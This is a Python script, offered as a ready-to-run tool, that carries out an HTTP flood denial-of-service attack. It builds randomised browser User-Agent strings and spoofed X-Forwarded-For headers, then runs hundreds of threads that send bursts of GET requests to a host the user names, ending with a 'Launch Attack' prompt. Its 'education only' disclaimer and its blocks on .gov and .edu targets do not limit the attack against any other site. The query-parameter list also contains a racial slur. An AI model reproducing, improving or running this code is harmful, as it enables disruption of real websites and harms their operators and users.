import socket
import threading
import sys
import os
import random

#Python HTTP Flood Code By 413xPr06605
#All Script Code By FTCoNR Is Free
#Our Script Is For Education Only, Not For Attack :D

useragents = []
string = ["id","q","a","s","page","result","search","login","user","nigga","ebola","hiv","covid","h1n1","language","data"]
newhost = ""

def GenUA():
    AW = str(random.randint(500,599))+".36"
    BV = str(random.randint(24,80))+".0."+str(random.randint(3000,4000))+"."+str(random.randint(1,200))
    OPR = str(random.randint(30,70))+".0."+str(random.randint(1000,4000))+"."+str(random.randint(1,1000))
    UCB = str(random.randint(5,12))+"."+str(random.randint(5,12))+"."+str(random.randint(0,10))+"."+str(random.randint(1,1000))
    devices = random.choice(
        [
            "IOS",
            "Windows",
            "X11",
            "Android",
            "Symbian",
            "Macintosh"
        ]
    )
    if devices =="Windows":
        version = random.choice(
            [
                "Windows NT 10.0; Win64; X64",
                "Windows NT 10.0; WOW64",
                "Windows NT 5.1; rv:7.0.1",
                "Windows NT 6.1; WOW64; rv:54.0",
                "Windows NT 6.3; Win64; x64",
                "Windows NT 6.3; WOW64; rv:13.37"
            ]
        )
    elif devices =="IOS":
        version = random.choice(
            [
                "iPhone; CPU iPhone OS 13_3 like Mac OS X",
                "iPad; CPU OS 13_3 like Mac OS X",
                "iPod touch; iPhone OS 4.3.3",
                "iPod touch; CPU iPhone OS 12_0 like Mac OS X"
            ]
        )
    elif devices =="X11":
        version = random.choice(
            [
                "X11; Linux x86_64",
                "X11; Ubuntu; Linux i686",
                "SMART-TV; Linux; Tizen 2.4.0",
                "X11; Ubuntu; Linux x86_64",
                "X11; U; Linux amd64",
                "X11; GNU/LINUX",
                "X11; CrOS x86_64 11337.33.7",
                "X11; Debian; Linux x86_64"
            ]
        )
    elif devices =="Android":
        version = random.choice(
            [
                "Linux; Android 4.2.1; Nexus 5 Build/JOP40D",
                "Linux; Android 4.3; MediaPad 7 Youth 2 Build/HuaweiMediaPad",
                "Linux; Android 4.4.2; SAMSUNG GT-I9195 Build/KOT49H",
                "Linux; Android 5.0; SAMSUNG SM-G900F Build/LRX21T",
                "Linux; Android 5.1.1; vivo X7 Build/LMY47V",
                "Linux; Android 6.0; Nexus 5 Build/MRA58N",
                "Linux; Android 7.0; TRT-LX2 Build/HUAWEITRT-LX2",
                "Linux; Android 8.0.0; SM-N9500 Build/R16NW",
                "Linux; Android 9.0; SAMSUNG SM-G950U"
            ]
        )
    elif devices =="Macintosh":
        version = random.choice(
            [
                "Macintosh; Intel Mac OS X 10_14_4",
                "Macintosh; U; Intel Mac OS X 12_10_0"
            ]
        )
    elif devices =="Symbian":
        version = random.choice(
            [
                "Series40; Nokia200/11.56; Profile/MITP-2.1 Configuration/CLDC-1.1",
                "SymbianOS/9.1; U; en-us",
                "Series30Plus; Nokia220/10.03.11; Profile/Series30Plus Configuration/Series30Plus"
            ]
        )
    borwser = random.choice(["chrome","uc","op"])
    if borwser =="chrome":
        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Chrome/"+ BV + " Safari/"+ AW#Python HTTP Flood Code By 413xPr06605
    elif borwser =="op":
        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Chrome/"+ BV + " Safari/"+ AW +" OPR/" + OPR#Python HTTP Flood Code By 413xPr06605
    elif borwser =="uc":
        return "User-Agent: Mozilla/5.0 ("+version+") AppleWebKit/"+ AW +" (KHTML, like Gecko) Version/4.0 Chrome/"+ BV + " UCBrowser/" + UCB + " Safari/"+ AW#Python HTTP Flood Code By 413xPr06605

def flood(host, port, path, event, x):#Python HTTP Flood Code By 413xPr06605
    http_ver_host = " HTTP/1.1\r\nHost: " + host + "\r\n"
    connection = "Connection: Keep-Alive\r\n"
    accept = "Accept: */*\r\n"
    referer = "Referer: https://freethecode.cf/"
    fake_addr = "X-Forwarded-For: 1.0.0.1, 8.8.8.8, 1.1.1.1\r\n"
    useragent = useragents[x] + "\r\n"
    count = 0
    event.wait()
    while 1:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.connect_ex((str(host), int(port)))
            try:
                for _ in range(100):
                    http = "GET " + path + "?" + random.choice(string) + "=" + str(random.randint(880906, 19990906))#Python HTTP Flood Code By 413xPr06605
                    request = http + http_ver_host + connection + accept + referer + fake_addr + useragent + "\r\n"#Python HTTP Flood Code By 413xPr06605
                    s.send(str(request).encode())
                count += 100
                print("Threads [%s] | <%s> Request Sent "%(x, count))
                s.close()
            except:
                s.close()
        except:
            s.close()

if len(sys.argv) !=5:
    os.system("clear")
    print("""\n
    Script Code By 413xPr06605
    This is Simple Dos , Not DDoS
    Don't Try This Script On Website
    You Just Can Test On Dstat\n""")
    print("---------------------------------------------------------------")#Python HTTP Flood Code By 413xPr06605
    print("     Usage : %s <host> <port> <threads> <path>"%(sys.argv[0]))
    print("---------------------------------------------------------------")#Python HTTP Flood Code By 413xPr06605
    #Python HTTP Flood Code By 413xPr06605
    sys.exit()

host = str(sys.argv[1])
if "http://" in host:
    for _ in range((len(host)-7)):
        newhost = newhost + host[_+7]
    host = newhost
elif "https://" in host:
    for _ in range((len(host)-8)):
        newhost = newhost + host[_+8]
    host = newhost
if "192.168" in host or "localhost" in host:
    print("\nInvalid Hostname !\n")
    sys.exit()
elif ".gov" in host or ".edu" in host:
    print("\nGov And Edu Site Is Not For DoS Attack !\n")
    sys.exit()
port = int(sys.argv[2])
thr = int(sys.argv[3])
if thr > 800:
    print("Threads Limit Is 800")
    sys.exit()
path = str(sys.argv[4])
event = threading.Event()

for _ in range(thr):
    user_agent = GenUA()
    useragents.append(user_agent)
for x in range(thr):
    t = threading.Thread(target=flood, args=(host, port, path, event, x, ))#Python HTTP Flood Code By 413xPr06605
    t.start()
input("\nPress Enter For Launch Attack")
event.set()
#Python HTTP Flood Code By 413xPr06605